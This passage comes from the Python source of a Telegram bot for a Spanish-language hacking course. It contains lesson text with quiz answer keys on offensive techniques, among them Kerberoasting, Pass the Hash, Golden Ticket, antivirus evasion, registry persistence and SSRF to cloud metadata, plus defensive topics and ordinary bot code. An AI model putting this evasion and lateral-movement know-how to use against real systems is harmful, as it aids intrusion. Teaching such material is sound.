  "m20": { "title": "M20: Análisis de Malware - Dinámico", "theory": "El <b>Análisis Dinámico de Malware</b> implica ejecutar el malware en un entorno seguro y controlado (una 'sandbox' o una máquina virtual aislada) para observar su comportamiento. Herramientas como Process Monitor (ProcMon) y Wireshark se utilizan para monitorizar qué archivos crea, qué claves de registro modifica, y con qué servidores se comunica en la red.", "practice": "<b>Práctica:</b> Al ejecutar un malware en una sandbox, notas que intenta conectarse a una dirección IP en Rusia. ¿Qué herramienta te permitió ver esta actividad de red?", "answer": ["wireshark"] },
  "m21": { "title": "M21: Inyección de Código", "theory": "A diferencia de la inyección de comandos, la <b>inyección de código</b> inserta código en un proceso en ejecución. Técnicas como <b>DLL Injection</b> en Windows cargan una librería maliciosa en un proceso legítimo (ej. explorer.exe) para ocultar su actividad y heredar sus privilegios.", "practice": "<b>Práctica:</b> Si un malware inyecta su código en `svchost.exe` para realizar peticiones de red, ¿qué objetivo principal persigue?", "answer": ["evasion", "ocultarse"] },
  "m22": { "title": "M22: Enumeración de SMB", "theory": "El protocolo <b>SMB (Server Message Block)</b>, puerto 445, es fundamental en redes Windows para compartir archivos e impresoras. Enumerar SMB puede revelar nombres de usuario, recursos compartidos (shares) públicos y versiones del sistema operativo. Una versión antigua y sin parches de SMB puede ser vulnerable a exploits como EternalBlue.", "practice": "<b>Práctica:</b> ¿Qué puerto es el estándar para el protocolo SMB?", "answer": ["445"] },
  "m23": { "title": "M23: Ataques de Fuerza Bruta", "theory": "Un ataque de <b>Fuerza Bruta</b> consiste en probar sistemáticamente todas las combinaciones posibles de contraseñas hasta encontrar la correcta. Es un método lento pero efectivo contra contraseñas cortas o simples. Servicios como SSH, FTP o RDP son objetivos comunes. Herramientas como <b>Hydra</b> automatizan este proceso.", "practice": "<b>Práctica:</b> ¿Qué medida de seguridad es la más efectiva para mitigar un ataque de fuerza bruta en un formulario de login?", "answer": [["bloqueo", "cuenta"], ["limite", "intentos"]] },
  "m24": { "title": "M24: Vulnerabilidades de Deserialización", "theory": "La <b>serialización</b> convierte un objeto (datos en memoria) a un formato que puede ser almacenado o transmitido (ej. JSON, XML). La <b>deserialización</b> es el proceso inverso. Si una aplicación deserializa datos no confiables de un usuario sin validarlos, un atacante puede manipular los datos serializados para ejecutar código arbitrario en el servidor.", "practice": "<b>Práctica:</b> Si una aplicación web envía un objeto serializado en una cookie y un atacante lo modifica para ejecutar comandos, ¿cómo se llama esta vulnerabilidad?", "answer": ["deserializacion insegura"] },
  "m25": { "title": "M25: Criptografía - Firmas Digitales", "theory": "Una <b>Firma Digital</b>, basada en criptografía asimétrica, proporciona <b>autenticidad</b> (prueba quién envió el mensaje), <b>integridad</b> (prueba que no ha sido modificado) y <b>no repudio</b> (el emisor no puede negar haberlo enviado). Se crea cifrando el hash de un mensaje con la clave privada del emisor. Cualquiera puede verificarla usando la clave pública del emisor.", "practice": "<b>Práctica:</b> ¿Qué clave se utiliza para <b>crear</b> una firma digital?", "answer": ["privada"] },
  "m26": { "title": "M26: Evasión de IDS/IPS", "theory": "Los <b>Sistemas de Detección/Prevención de Intrusos (IDS/IPS)</b> buscan patrones de ataque en el tráfico de red. Las técnicas de evasión incluyen el uso de <b>cifrado</b> (HTTPS), la <b>fragmentación de paquetes</b>, y el envío de tráfico muy lento (<b>low and slow attack</b>) para pasar por debajo del umbral de detección.", "practice": "<b>Práctica:</b> ¿Por qué el uso masivo de HTTPS en Internet ha complicado la tarea de los IDS/IPS?", "answer": ["cifrado", "trafico cifrado"] },
  "m27": { "title": "M27: Fuzzing", "theory": "El <b>Fuzzing</b> es una técnica de prueba de software automatizada que consiste en enviar datos malformados, inesperados o aleatorios a una aplicación para provocar fallos (crashes). Es extremadamente efectivo para encontrar vulnerabilidades de corrupción de memoria, como los buffer overflows, en aplicaciones que procesan formatos de archivo complejos (PDFs, imágenes) o protocolos de red.", "practice": "<b>Práctica:</b> Si quieres encontrar una vulnerabilidad de tipo 'zero-day' en el parser de imágenes PNG de un navegador, ¿qué técnica de prueba automatizada sería la más adecuada?", "answer": ["fuzzing"] },
  "m28": { "title": "M28: Threat Intelligence", "theory": "La <b>Inteligencia de Amenazas (Threat Intelligence)</b> es el conocimiento basado en evidencia (contexto, mecanismos, indicadores, implicaciones) sobre una amenaza existente o emergente. Ayuda a las organizaciones a tomar decisiones de seguridad más rápidas e informadas. Un <b>Indicador de Compromiso (IoC)</b> es una pieza de evidencia forense, como una IP o un hash de archivo malicioso.", "practice": "<b>Práctica:</b> El hash de un archivo encontrado en tu red coincide con el de un malware conocido usado por el grupo APT28. ¿Qué tipo de artefacto de threat intelligence es este hash?", "answer": ["ioc", "indicador de compromiso"] },
  "m29": { "title": "M29: Scripting con Scapy", "theory": "<b>Scapy</b> es una potente librería de Python que permite crear, enviar, capturar y analizar paquetes de red. A diferencia de otras herramientas, Scapy te da control total sobre cada campo de los paquetes (IP, TCP, etc.), lo que la hace ideal para crear herramientas de escaneo personalizadas, realizar ataques de red a medida o realizar pruebas de protocolos.", "practice": "<b>Práctica:</b> Si quieres crear un paquete TCP SYN desde cero en Scapy, ¿qué dos capas (como mínimo) necesitas apilar juntas?", "answer": ["ip", "tcp"] },
  "m30": { "title": "M30: Desafío Medio Final", "theory": "Este desafío combina explotación web con escalada de privilegios. Debes pensar en cadena, donde el resultado de un paso es la entrada del siguiente.", "practice": "<b>Práctica:</b> Explotas una LFI en un servidor web y logras leer el archivo <code>/home/user/.bash_history</code>. Dentro, encuentras el comando <code>sudo -l</code>. ¿Qué información crucial esperas obtener de este comando para tu siguiente paso?", "answer": [["privilegios", "sudo"], ["comandos", "root"]] },

  "p1": { "title": "P1: Exploit Dev - Buffer Overflow", "theory": "Un <b>Buffer Overflow</b> sobrescribe la pila para controlar el <b>puntero de instrucción (EIP/RIP)</b>. Un 'NOP sled' es una secuencia de instrucciones 'No Operation' (<code>0x90</code>) que se coloca antes del shellcode para aumentar la probabilidad de que la ejecución salte a él.", "practice": "<b>Práctica:</b> ¿Qué registro de la CPU es el objetivo a sobrescribir para controlar el flujo de ejecución?", "answer": ["eip", "rip"] },
  "p2": { "title": "P2: Metodología Red Team", "theory": "Un <b>Red Team</b> simula a un adversario real (APT) para probar las defensas de una organización de forma integral y sigilosa. El objetivo no es solo encontrar vulnerabilidades, sino permanecer sin ser detectado y alcanzar objetivos específicos. Fases: Reconocimiento, Acceso Inicial, Persistencia, Escalada de Privilegios, Movimiento Lateral, y Exfiltración.", "practice": "<b>Práctica:</b> ¿Qué fase se enfoca en asegurar el acceso a largo plazo a un sistema comprometido?", "answer": ["persistencia"] },
  "p3": { "title": "P3: Cloud Security - S3 Buckets", "theory": "Los <b>Buckets de Amazon S3</b> son un servicio de almacenamiento en la nube. Una mala configuración extremadamente común es dejarlos públicos, exponiendo gigabytes o terabytes de datos sensibles a cualquiera en Internet. Herramientas como la CLI de AWS (<code>aws s3 ls s3://nombre-del-bucket</code>) pueden usarse para explorar estos buckets mal configurados.", "practice": "<b>Práctica:</b> Si encuentras un bucket S3 público, ¿qué tipo de permiso mal configurado es el responsable más probable de la exposición de datos?", "answer": [["lectura", "publica"], ["acceso", "publico"]] },
  "p4": { "title": "P4: Server-Side Request Forgery (SSRF)", "theory": "En un ataque de <b>Falsificación de Peticiones del Lado del Servidor (SSRF)</b>, un atacante abusa de una funcionalidad de un servidor para que este realice peticiones a otros recursos en su nombre. Esto puede usarse para escanear la red interna, interactuar con servicios internos no expuestos a Internet, o consultar metadatos de proveedores de la nube (como la instancia de metadatos de AWS en <code>169.254.169.254</code>).", "practice": "<b>Práctica:</b> Un atacante explota una vulnerabilidad SSRF en un servidor alojado en AWS. ¿A qué dirección IP interna especial intentaría acceder para robar credenciales de la instancia?", "answer": ["169.254.169.254"] },
  "p5": { "title": "P5: Bypassing Antivirus", "theory": "La evasión de antivirus es un juego del gato y el ratón. Las defensas basadas en <b>firmas</b> buscan hashes de malware conocido. Para evadir esto, los atacantes usan <b>empaquetadores (packers)</b> y <b>criptores</b> para cambiar la firma del archivo. Las defensas basadas en <b>heurística</b> analizan el comportamiento del código, que se evade con técnicas de ofuscación y polimorfismo que hacen que el código malicioso parezca benigno.", "practice": "<b>Práctica:</b> ¿Qué técnica consiste en cifrar el payload malicioso y usar un pequeño 'stub' (código de arranque) para descifrarlo y ejecutarlo solo en memoria, evadiendo así el escaneo estático de archivos?", "answer": ["empaquetado", "packer", "criptor"] },
  "p6": { "title": "P6: Active Directory - Kerberoasting", "theory": "En redes de Windows con <b>Active Directory</b>, el <b>Kerberoasting</b> es un ataque de post-explotación. Un atacante con acceso a la red solicita tickets de servicio (TGS) para cuentas de usuario que están asociadas a un SPN (Service Principal Name). El TGS está cifrado con el hash de la contraseña de esa cuenta de servicio. El atacante puede llevarse este ticket y intentar crackearlo offline para obtener la contraseña en texto plano, a menudo de cuentas con altos privilegios.", "practice": "<b>Práctica:</b> ¿Qué se necesita crackear offline en un ataque de Kerberoasting para obtener la contraseña de una cuenta de servicio?", "answer": [["ticket", "servicio"], "tgs"] },
  "p7": { "title": "P7: Persistencia en Windows - Run Keys", "theory": "La <b>persistencia</b> es la técnica para mantener el acceso a un sistema comprometido. En Windows, una de las formas más simples y efectivas es añadir una entrada en las <b>claves de registro 'Run'</b>. Hay varias ubicaciones (<code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> y su equivalente en HKLM). Cualquier programa listado en estas claves se ejecutará automáticamente cada vez que el usuario inicie sesión, permitiendo que el malware se reactive.", "practice": "<b>Práctica:</b> ¿Qué herramienta de línea de comandos de Windows usarías para modificar directamente el registro y añadir una clave de persistencia?", "answer": ["reg", "reg.exe"] },
  "p8": { "title": "P8: C2 Frameworks (Comando y Control)", "theory": "Los <b>frameworks de Comando y Control (C2 o C&C)</b> son la infraestructura que los atacantes y Red Teams usan para gestionar remotamente los sistemas comprometidos. Un 'implante' o 'beacon' en la víctima se conecta periódicamente al servidor C2 del atacante para recibir tareas y enviar resultados. Las comunicaciones C2 a menudo se camuflan dentro de tráfico legítimo como DNS (DNS Tunneling) o HTTP/S para evadir la detección.", "practice": "<b>Práctica:</b> ¿Qué técnica de comunicación C2 es particularmente sigilosa porque se mezcla con el tráfico web cifrado que es omnipresente en las redes corporativas?", "answer": ["https"] },
  "p9": { "title": "P9: Introducción a la Forense Digital", "theory": "La <b>forense digital</b> es la ciencia de recuperar y analizar evidencia de dispositivos digitales. Un principio clave es el <b>orden de volatilidad</b>. Al investigar un sistema, se deben recolectar los datos más volátiles primero, ya que son los que se pierden más rápidamente. La jerarquía suele ser: Registros de la CPU/caché -> Memoria RAM -> Datos de la red -> Disco duro -> Backups.", "practice": "<b>Práctica:</b> Durante la respuesta a un incidente, un analista tiene un ordenador encendido que se sospecha está comprometido. Según el orden de volatilidad, ¿qué debería hacer primero: una copia del disco duro o un volcado de la memoria RAM?", "answer": [["volcado", "ram"], ["memoria", "ram"]] },
  "p10": { "title": "P10: Decodificando JWTs", "theory": "Los <b>JSON Web Tokens (JWT)</b> se usan para autenticación. Constan de 3 partes separadas por puntos: Header, Payload y Signature. Las dos primeras son simplemente objetos JSON codificados en Base64Url. Decodificarlas puede revelar información sobre el usuario y los permisos, aunque no valida la autenticidad del token.", "practice": "<b>Práctica:</b> Usa la herramienta <code>/jwt_decode</code> con el token `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.qdidZ_4gQNP5I3iPigha-2002j_S3QmBCgsJp0aGY8A`. ¿Cuál es el valor del campo 'role' en el payload?", "answer": ["admin"] },
  "p11": { "title": "P11: Reversing - Desensambladores vs Decompiladores", "theory": "Un <b>desensamblador</b> (como objdump) traduce el código máquina a lenguaje ensamblador, que es legible pero de muy bajo nivel. Un <b>decompilador</b> (como Ghidra) va un paso más allá e intenta revertir el ensamblador a un lenguaje de alto nivel como C, lo que facilita enormemente el análisis del programa.", "practice": "<b>Práctica:</b> Para entender rápidamente la lógica de un programa complejo sin analizar cada instrucción de bajo nivel, ¿qué herramienta sería más útil: un desensamblador o un decompilador?", "answer": ["decompilador"] },
  "p12": { "title": "P12: Exploit Dev - ROP Chains", "theory": "Las defensas modernas como <b>DEP (Data Execution Prevention)</b> impiden la ejecución de código en la pila. Para eludir esto, los atacantes usan <b>Return-Oriented Programming (ROP)</b>. En lugar de inyectar su propio shellcode, reutilizan pequeños fragmentos de código existentes en el programa (llamados 'gadgets') que terminan en una instrucción `ret`. Encadenando estos gadgets, pueden ejecutar operaciones complejas sin introducir nuevo código ejecutable.", "practice": "<b>Práctica:</b> ¿Cuál es la principal defensa a nivel de sistema operativo que la técnica de ROP está diseñada para eludir?", "answer": ["dep", "data execution prevention"] },
  "p13": { "title": "P13: Evasión de Defensas - Sandboxing", "theory": "Las <b>sandboxes</b> son entornos aislados donde se ejecuta malware para analizar su comportamiento. El malware avanzado a menudo incluye técnicas de <b>evasión de sandbox</b>. Puede buscar artefactos típicos de una VM (drivers de VirtualBox, direcciones MAC específicas), comprobar la interacción del usuario (movimiento del ratón) o simplemente permanecer inactivo por un tiempo (sleep) para evitar la detección automatizada.", "practice": "<b>Práctica:</b> Un malware se ejecuta, pero no hace nada malicioso durante los primeros 10 minutos. ¿Qué técnica de evasión podría estar utilizando?", "answer": ["sleep", "dormir", "retraso"] },
  "p14": { "title": "P14: Movimiento Lateral - Pass the Hash", "theory": "En redes Windows, <b>Pass the Hash (PtH)</b> es una técnica de movimiento lateral que permite a un atacante autenticarse en un sistema remoto sin necesidad de crackear la contraseña. Si el atacante obtiene el hash NTLM de la contraseña de un usuario, puede usar herramientas como Mimikatz para pasar directamente ese hash al servicio de autenticación y acceder a otros sistemas donde ese usuario tenga permisos.", "practice": "<b>Práctica:</b> ¿Qué herramienta es la más famosa y utilizada para ejecutar ataques de Pass the Hash en Windows?", "answer": ["mimikatz"] },
  "p15": { "title": "P15: Blue Team - Detección de Amenazas", "theory": "Un <b>Blue Team</b> es responsable de la defensa de una organización. La <b>Detección de Amenazas (Threat Hunting)</b> es una actividad proactiva donde los analistas buscan en sus redes y sistemas evidencia de compromiso que no ha sido detectada por las herramientas automatizadas. Se basan en hipótesis (ej. '¿Y si un atacante está usando PowerShell para movimiento lateral?') y buscan IoCs y TTPs (Tácticas, Técnicas y Procedimientos) de adversarios.", "practice": "<b>Práctica:</b> Un analista de Blue Team sospecha que un atacante podría estar usando DNS Tunneling para exfiltrar datos. ¿En qué tipo de logs debería enfocarse para buscar esta actividad?", "answer": ["dns"] },
  "p16": { "title": "P16: Forense de Memoria - Volatility", "theory": "La <b>forense de memoria RAM</b> es el análisis de un volcado de la memoria de un sistema. Es crucial porque muchos malwares operan 'sin archivo' (fileless), existiendo solo en la memoria. La herramienta <b>Volatility</b> es el estándar para analizar estos volcados, permitiendo extraer listas de procesos, conexiones de red activas en el momento de la captura, claves de registro cargadas e incluso contraseñas en texto plano.", "practice": "<b>Práctica:</b> Con Volatility, ¿qué plugin usarías para ver las conexiones de red que estaban activas cuando se tomó el volcado de memoria?", "answer": ["netscan"] },
  "p17": { "title": "P17: Web - Insecure Direct Object References (IDOR)", "theory": "<b>IDOR</b> es una vulnerabilidad de control de acceso que ocurre cuando una aplicación expone una referencia directa a un objeto interno (como un ID de usuario o de archivo en la URL) y no verifica si el usuario que realiza la petición tiene permiso para acceder a ese objeto. Por ejemplo, si al ver tu perfil la URL es `.../profile?id=123`, un atacante podría cambiarla a `.../profile?id=124` para ver el perfil de otro usuario.", "practice": "<b>Práctica:</b> Para prevenir una vulnerabilidad IDOR, ¿qué tipo de verificación debe realizar siempre el servidor antes de mostrar o modificar un objeto?", "answer": [["control", "acceso"], "autorizacion"] },
  "p18": { "title": "P18: Contenedores - Docker Security", "theory": "La <b>seguridad de contenedores Docker</b> es un campo emergente. Una mala práctica común es ejecutar contenedores con el usuario <b>root</b>. Si un atacante compromete una aplicación dentro del contenedor, operará como root dentro de él. Si además el contenedor está mal configurado o hay una vulnerabilidad en Docker, podría escapar del contenedor y comprometer el sistema anfitrión.", "practice": "<b>Práctica:</b> ¿Cuál es el principio de seguridad que se viola al ejecutar un proceso dentro de un contenedor como usuario 'root'?", "answer": [["minimo", "privilegio"]] },
  "p19": { "title": "P19: Criptoanálisis", "theory": "El <b>Criptoanálisis</b> es el estudio de cómo romper sistemas criptográficos. Un tipo de ataque fundamental es el <b>análisis de frecuencias</b>, que se usa contra cifrados de sustitución simples (como el Cifrado César). Se basa en que ciertos caracteres (como la 'E' en inglés o español) aparecen con mucha más frecuencia que otros. Al contar la frecuencia de los caracteres en el texto cifrado, se pueden hacer suposiciones sobre la clave.", "practice": "<b>Práctica:</b> ¿Contra qué tipo de cifrado es más efectivo el análisis de frecuencias?", "answer": ["sustitucion"] },
  "p20": { "title": "P20: Ataques de Contraseña - Spraying", "theory": "El <b>Password Spraying</b> es un tipo de ataque de fuerza bruta que invierte la lógica. En lugar de probar muchas contraseñas para un solo usuario, el atacante prueba una o dos contraseñas muy comunes (ej: 'Invierno2024!') contra una gran lista de nombres de usuario. Este método es lento pero muy sigiloso, ya que evita los bloqueos de cuenta que se activan por múltiples intentos fallidos en un solo usuario.", "practice": "<b>Práctica:</b> ¿Cuál es el principal objetivo de un ataque de Password Spraying para evitar ser detectado?", "answer": [["evitar", "bloqueo"]] },
  "p21": { "title": "P21: Golden Ticket Attack", "theory": "Un ataque de <b>Golden Ticket</b> es una técnica de post-explotación en Active Directory. Un atacante que ha comprometido el hash de la cuenta <b>KRBTGT</b> (la cuenta de servicio del Key Distribution Center) puede forjar Tickets de Concesión de Tickets (TGTs) para cualquier usuario, con cualquier privilegio y con un tiempo de vida indefinido. Es el ataque de persistencia y escalada de privilegios definitivo en un entorno AD.", "practice": "<b>Práctica:</b> ¿El hash de qué cuenta es necesario comprometer para poder crear un Golden Ticket?", "answer": ["krbtgt"] },
  "p22": { "title": "P22: WebSockets Security", "theory": "Los <b>WebSockets</b> permiten una comunicación bidireccional y persistente entre cliente y servidor. Las vulnerabilidades comunes incluyen <b>Cross-Site WebSocket Hijacking (CSWSH)</b>, donde un sitio malicioso puede iniciar una conexión WebSocket a un sitio vulnerable en nombre de la víctima, y la falta de cifrado (usar <code>ws://</code> en lugar de <code>wss://</code>).", "practice": "<b>Práctica:</b> Si una comunicación WebSocket no está cifrada, ¿qué protocolo se está utilizando?", "answer": ["ws"] },
  "p23": { "title": "P23: DevSecOps", "theory": "<b>DevSecOps</b> es una filosofía que integra la seguridad en cada fase del ciclo de vida del desarrollo de software (DevOps). En lugar de que la seguridad sea un control final, se automatiza y se incluye desde el principio ('shifting left'). Herramientas de <b>SAST</b> (Análisis Estático) y <b>DAST</b> (Análisis Dinámico) se integran en los pipelines de CI/CD para encontrar vulnerabilidades antes del despliegue.", "practice": "<b>Práctica:</b> ¿Cómo se llama la práctica de integrar la seguridad desde las primeras fases del desarrollo de software?", "answer": [["shift", "left"]] },
  "p24": { "title": "P24: Evasión de Defensas - API Hooking", "theory": "El <b>API Hooking</b> es una técnica avanzada usada por malware (y antivirus) para interceptar llamadas a funciones. El malware puede 'enganchar' (hook) funciones del sistema operativo (como las que escriben archivos o se comunican por red) para modificar su comportamiento, ocultar su actividad o robar datos antes de que sean cifrados. Es una técnica de evasión muy potente.", "practice": "<b>Práctica:</b> Si un keylogger quiere capturar las contraseñas que escribes en cualquier aplicación, ¿qué tipo de funciones del sistema operativo es más probable que intercepte (hook)?", "answer": [["entrada", "teclado"], ["keyboard", "input"]] },
  "p25": { "title": "P25: Ataques a Cadenas de Suministro (Supply Chain)", "theory": "Un <b>ataque a la cadena de suministro</b> no se dirige directamente a la organización objetivo, sino a uno de sus proveedores de software o hardware. El atacante compromete al proveedor e introduce código malicioso en una actualización de software legítima. Cuando la organización objetivo instala la actualización, se infecta. El ataque a SolarWinds es el ejemplo más famoso.", "practice": "<b>Práctica:</b> Si un atacante modifica una librería popular en GitHub para que incluya malware, y miles de proyectos que usan esa librería se ven comprometidos, ¿qué tipo de ataque ha realizado?", "answer": [["cadena", "suministro"], ["supply", "chain"]] },
  "p26": { "title": "P26: Hardening de Kernel Linux", "theory": "Asegurar el <b>kernel</b> es la base de la seguridad en Linux. Técnicas como <b>ASLR (Address Space Layout Randomization)</b>, que aleatoriza las direcciones de memoria, y el uso de módulos de seguridad como <b>SELinux</b> o <b>AppArmor</b>, que aplican políticas de control de acceso mandatorio (MAC), hacen que la explotación de vulnerabilidades a nivel de kernel sea mucho más difícil.", "practice": "<b>Práctica:</b> ¿Qué técnica de mitigación de exploits dificulta que un atacante conozca la dirección de memoria de una función que quiere llamar en una ROP chain?", "answer": ["aslr"] },
  "p27": { "title": "P27: Respuesta a Incidentes - IR Playbooks", "theory": "Un <b>Playbook de Respuesta a Incidentes (IR)</b> es un conjunto de pasos predefinidos y estandarizados que una organización debe seguir cuando se detecta un incidente de seguridad (ej. un brote de ransomware). Tener playbooks para diferentes escenarios permite una respuesta rápida, coordinada y eficaz, minimizando el tiempo de inactividad y el impacto del ataque.", "practice": "<b>Práctica:</b> En la respuesta a un incidente de ransomware, ¿cuál es el primer paso inmediato después de detectar la infección para evitar que se propague más?", "answer": ["aislar", "contener", "desconectar"] },
  "p28": { "title": "P28: Exploit Dev - Heap Spraying", "theory": "El <b>Heap Spraying</b> es una técnica usada en la explotación de vulnerabilidades, a menudo en navegadores. Consiste en llenar una gran parte del 'heap' (un área de memoria para datos dinámicos) con múltiples copias del shellcode del atacante. Esto aumenta enormemente la probabilidad de que cuando la vulnerabilidad se active y corrompa un puntero para que apunte a una ubicación predecible en el heap, aterrice en el shellcode.", "practice": "<b>Práctica:</b> ¿En qué región de la memoria de un proceso se enfoca la técnica de Heap Spraying?", "answer": ["heap"] },
  "p29": { "title": "P29: Honeypots", "theory": "Un <b>Honeypot</b> es un sistema señuelo diseñado para ser atacado. Se configura para parecer un sistema real y vulnerable (ej. un servidor web, una base de datos) para atraer a los atacantes. Su objetivo es distraer a los atacantes de los sistemas reales y, lo más importante, permitir a los defensores estudiar sus TTPs (Tácticas, Técnicas y Procedimientos) en un entorno controlado.", "practice": "<b>Práctica:</b> ¿Cuál es el propósito principal de un honeypot: proteger datos o estudiar al atacante?", "answer": ["estudiar al atacante"] },
  "p30": { "title": "P30: Desafío Pro Final II", "theory": "Este es el desafío definitivo. Combina OSINT, explotación web, movimiento lateral y criptografía. Cada paso revela una pista para el siguiente. Debes actuar como un verdadero pentester profesional.", "practice": "<b>Práctica:</b> En el subdominio `internal-api.megacorpone.com` (encontrado previamente) hay un endpoint vulnerable a SSRF en `?url=`. Úsalo para acceder a los metadatos de la instancia cloud y obtener el token de sesión. El token está codificado en Base64 dos veces. Decodifícalo. Responde con la palabra final.", "answer": ["dominacion"] }
}

BASE_CONTENT_HUB = create_full_content_hub()

# ========= Base de Datos =========
def get_db():
    if not os.path.exists(DB_FILE):
        return {
            "users": {}, "keys": {}, "content": BASE_CONTENT_HUB, "course_structure": BASE_COURSE_STRUCTURE,
            "stats": {"total_users": 0, "active_vip": 0, "commands": {}},
            "bot_state": {"maintenance_mode": False},
            "daily_ctf": {"practice": "No hay CTF activo.", "answer": [], "solvers": [], "date": ""}
        }
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            db = json.load(f)
            db.setdefault('users', {}); db.setdefault('keys', {})
            db.setdefault('content', BASE_CONTENT_HUB); db.setdefault('course_structure', BASE_COURSE_STRUCTURE)
            db.setdefault('stats', {'total_users': 0, 'active_vip': 0, 'commands': {}})
            db.setdefault('bot_state', {'maintenance_mode': False})
            db.setdefault('daily_ctf', {"practice": "No hay CTF activo.", "answer": [], "solvers": [], "date": ""})
            return db
    except (json.JSONDecodeError, FileNotFoundError):
        logger.error("Error al leer la base de datos.")
        return {}

def save_db(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def is_lesson_free(lesson_id):
    return lesson_id in ["b1", "b2", "b3"]

def get_user_data(user_id):
    db = get_db()
    user_id_str = str(user_id)
    user = db.get("users", {}).get(user_id_str)
    if not user: return None
    user.setdefault('progress', {level: [] for level in db.get('course_structure', {})})
    user.setdefault('points', 0)
    user.setdefault('last_seen', datetime.now().isoformat())
    return user

def check_flexible_answer(user_answer: str, correct_answers: list) -> bool:
    normalized_user_answer = user_answer.lower().strip()
    if not correct_answers: return False
    if isinstance(correct_answers[0], list):
        for and_group in correct_answers:
            if all(keyword.lower() in normalized_user_answer for keyword in and_group): return True
        return False
    else:
        for keyword in correct_answers:
            if keyword.lower() in normalized_user_answer: return True
        return False

# ========= Decoradores =========
def check_maintenance(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        db = get_db()
        if db.get("bot_state", {}).get("maintenance_mode", False) and update.effective_user.id != ADMIN_ID:
            message = update.message or (update.callback_query and update.callback_query.message)
            if message: await message.reply_text(MAINTENANCE_MESSAGE, reply_markup=None)
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

def log_command_usage(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        command_name = func.__name__.replace("_command", "").replace("_start", "")
        db = get_db()
        if db:
            db["stats"]["commands"][command_name] = db["stats"]["commands"].get(command_name, 0) + 1
            save_db(db)
        return await func(update, context, *args, **kwargs)
    return wrapper

def admin_only(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        if update.effective_user.id != ADMIN_ID:
            message = update.message or (update.callback_query and update.callback_query.message)
            if message: await message.reply_text("🚫 Acceso denegado. Solo admin.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

# ========= Lógica de Comandos y Menús Separada =========
async def _display_start_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message or update.callback_query.message
    welcome_msg = (f"¡Hola, <b>{update.effective_user.first_name}</b>! 👋\n\n"
                   f"Bienvenido a <b>CyberHub Academy v53.0</b>.")
    keyboard = [
        [InlineKeyboardButton("🎓 Iniciar Formación", callback_data="menu:course")],
        [InlineKeyboardButton("🏆 Leaderboard", callback_data="menu:leaderboard"), InlineKeyboardButton("🔥 CTF Diario", callback_data="menu:daily_ctf")],
        [InlineKeyboardButton("🛠️ Arsenal de Herramientas", callback_data="menu:tools")],
        [InlineKeyboardButton("⭐ Planes VIP", callback_data="menu:vip"), InlineKeyboardButton("👤 Mi Perfil", callback_data="menu:profile")],
        [InlineKeyboardButton("🔑 Canjear Clave", callback_data="menu:redeem")],
        [InlineKeyboardButton("📝 Feedback", callback_data="menu:feedback"), InlineKeyboardButton("🔄 Lección Random", callback_data="menu:random")]
    ]
    if hasattr(update, 'callback_query') and update.callback_query:
        await message.edit_text(welcome_msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
    else:
        await message.reply_html(welcome_msg, reply_markup=InlineKeyboardMarkup(keyboard))

async def _display_profile(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id_to_show: int):
    message = update.message or update.callback_query.message
    user_data = get_user_data(user_id_to_show)
    if not user_data: return await message.reply_text("❌ Usuario no encontrado.")
    db = get_db()
    all_user_ids_sorted = [u_id for u_id, u_data in sorted(db.get('users', {}).items(), key=lambda item: item[1].get('points', 0), reverse=True) if u_data.get('points', 0) > 0 and not u_data.get('banned')]
    try:
        rank = all_user_ids_sorted.index(str(user_id_to_show)) + 1
        rank_str = f"#{rank}"
    except ValueError: rank_str = "Sin Ranking"
    completed_practices = sum(len(p) for p in user_data.get('progress', {}).values())
    text = (f"👤 <b>Perfil de @{user_data.get('username', 'N/A')}</b>\n"
            f"🆔 <code>{user_id_to_show}</code>\n\n"
            f"🏆 <b>Puntos:</b> {user_data.get('points', 0)}\n"
            f"🌍 <b>Ranking Global:</b> {rank_str}\n"
            f"✔️ <b>Prácticas Resueltas:</b> {completed_practices}")
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="menu:main")]])
    if hasattr(update, 'callback_query') and update.callback_query:
        await message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    else: await message.reply_html(text)

async def _display_leaderboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message or update.callback_query.message
    db = get_db()
    valid_users = {uid: data for uid, data in db.get('users', {}).items() if data.get('points', 0) > 0 and not data.get('banned', False)}
    text = "🏆 <b>Leaderboard Global</b>\n\n"
    if not valid_users:
        text += "Aún no hay nadie en el leaderboard. ¡Sé el primero!"
    else:
        sorted_users = sorted(valid_users.items(), key=lambda item: item[1]['points'], reverse=True)
        medals = ["🥇", "🥈", "🥉"]
        for i, (user_id, user_data) in enumerate(sorted_users[:LEADERBOARD_SIZE]):
            rank = medals[i] if i < 3 else f"<b>#{i+1}</b>"
            username = user_data.get('username', f'Usuario_{user_id[-4:]}')
            points = user_data.get('points', 0)
            text += f"{rank} @{username} - {points} puntos\n"
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="menu:main")]])
    if hasattr(update, 'callback_query') and update.callback_query: await message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    else: await message.reply_html(text, reply_markup=kb)

async def _display_daily_ctf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message or update.callback_query.message
    db = get_db()
    ctf = db.get('daily_ctf', {})
    user_id_str = str(update.effective_user.id)
    today_str = datetime.now().strftime("%Y-%m-%d")
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="menu:main")]])
    text = ""
